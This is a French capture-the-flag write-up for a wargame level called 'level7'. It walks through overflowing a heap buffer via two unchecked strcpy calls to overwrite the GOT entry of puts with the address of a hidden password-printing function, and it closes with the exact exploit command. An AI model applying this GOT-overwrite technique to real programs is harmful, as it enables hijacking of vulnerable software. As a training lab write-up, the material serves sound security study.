## Le programme
Le programme ouvre le fichier leve8/.pass et lit 68 caracteres dans la variable globale c

Le programme crash lorsqu'on l'analyse avec gdb ou ltrace avant de finir le fgets car fopen return NULL par securite, donc on ne pourra pas lire le flag grace a gdb.

La fonction m print c mais n'est jamais appelee

Avant d'ouvrir le fichier, le programme fait plusieurs petits mallocs et fait deux strcpy de argv[1] et argv[2], sans securite.

On deduit que l'on doit exploiter les strcpy pour modifier l'entree dans la GOT de la fonction puts, pour qu'elle appele a la place la fonction m.

## Trouver m et puts
```
> objdump -d level7

080484f4 <m>:
 80484f4:	55                   	push   %ebp
...

08048400 <puts@plt>:
 8048400:	ff 25 28 99 04 08    	jmp    *0x8049928
...
```
Il nous faudra donc ecrire a l'adresse `0x08049928` l'adresse `0x080484f4`
## Trouver l'adresse des strcpy
```
> ltrace ./level7 a b

...

strcpy(0x0804a018, "a")                                                                                                                        = 0x0804a018
strcpy(0x0804a038, "b")                                                                                                                        = 0x0804a038

...

--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
* `0x0804a018` est l'adresse de destination du premier strcpy
* `0x0804a038` est l'adresse de destination du deuxieme strcpy

En experimentant on voit qu'il faut un offset de 20 bytes pour overwrite l'adresse de destination du deuxieme strcpy

## Final
Les arguments doivent etre dans le format suivant:
* 20 bytes + adresse de la GOT de puts
* adresse de la fonction m

```
./level7 `printf "aaaaaaaaaaaaaaaaaaaa\x28\x99\x04\x08"` `printf "\xf4\x84\x04\x08"`
```
